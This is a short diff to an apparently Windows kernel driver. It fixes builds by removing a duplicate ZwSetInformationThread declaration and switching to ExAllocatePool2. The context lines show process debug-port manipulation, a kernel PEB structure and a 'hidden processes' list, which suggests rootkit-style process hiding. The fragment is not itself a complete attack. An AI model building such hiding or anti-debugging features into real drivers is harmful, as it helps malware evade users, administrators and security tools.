@@ -17,19 +17,11 @@ extern "C" {
 	NTKERNELAPI NTSTATUS PsSetCreateThreadNotifyRoutine(
 		PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine
 	);
-
 	NTKERNELAPI NTSTATUS ZwQuerySystemInformation(
 		ULONG SystemInformationClass,
 		PVOID SystemInformation,
 		ULONG SystemInformationLength,
 		PULONG ReturnLength
-	);
-
-	NTKERNELAPI NTSTATUS ZwSetInformationThread(
-		HANDLE ThreadHandle,
-		ULONG ThreadInformationClass,
-		PVOID ThreadInformation,
-		ULONG ThreadInformationLength
 	);
 
 	NTKERNELAPI NTSTATUS ZwCreateProcess(
@@ -80,6 +72,9 @@ extern "C" {
 	NTKERNELAPI PPEB PsGetProcessPeb(PEPROCESS Process);
 	NTKERNELAPI PVOID PsGetProcessDebugPort(PEPROCESS Process);
 	NTKERNELAPI NTSTATUS PsSetProcessDebugPort(PEPROCESS Process, PVOID DebugPort);	NTKERNELAPI UCHAR* PsGetProcessImageFileName(PEPROCESS Process);
+
+	// Remove duplicate declaration - already in ntddk.h
+	// NTKERNELAPI NTSTATUS ZwSetInformationThread(...)
 
 	// Custom PEB structure for kernel mode access
 	typedef struct _KERNEL_PEB {
@@ -443,9 +438,8 @@ namespace driver
 			}
 			ListEntry = ListEntry->Flink;
 		}
-
 		// Add to hidden list
-		HiddenProcess* NewHiddenProcess = (HiddenProcess*)ExAllocatePoolWithTag(NonPagedPool, sizeof(HiddenProcess), 'HidP');
+		HiddenProcess* NewHiddenProcess = (HiddenProcess*)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HiddenProcess), 'HidP');
 		if (!NewHiddenProcess)
 		{
 			KeReleaseSpinLock(&g_hidden_processes_lock, OldIrql);
